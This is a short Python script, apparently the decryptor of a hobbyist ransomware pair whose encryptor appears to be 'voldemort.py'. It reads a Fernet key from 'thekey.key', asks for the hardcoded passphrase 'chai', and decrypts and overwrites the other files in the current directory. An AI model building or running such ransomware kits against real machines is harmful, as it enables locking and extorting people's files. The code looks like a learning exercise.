import os
from cryptography.fernet import Fernet
files=[]
for file in os.listdir():
       if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
           continue
       if os.path.isfile(file):
           files.append(file)
print(files)

with open("thekey.key","rb") as key:
      secretkey = key.read()

secret_phrase = "chai"
user_phrase = input("Enter your phrase :")

if user_phrase == secret_phrase:
 

       for file in files:
           with open(file, "rb") as thefile:
               contents = thefile.read()
           contents_decrypted = Fernet(secretkey).decrypt(contents)

           with open(file , "wb") as thefile:
               thefile.write(contents_decrypted)
           print("Congrats, your files are DECRYPTED,enjoy your chai")

else :
       print("Nahhhh, Wrong secret phrase. Try again")      
